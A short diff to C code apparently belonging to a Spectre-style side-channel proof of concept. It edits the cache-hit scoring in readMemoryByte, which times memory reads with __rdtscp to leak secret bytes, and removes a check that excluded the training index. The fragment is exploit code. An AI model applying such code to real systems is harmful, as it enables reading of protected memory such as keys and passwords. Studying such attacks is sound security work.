@@ -78,7 +78,7 @@ void readMemoryByte(int cache_hit_threshold, size_t secret_x, uint8_t value[2], 
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 
-      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+      if ((int)time2 <= cache_hit_threshold)
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
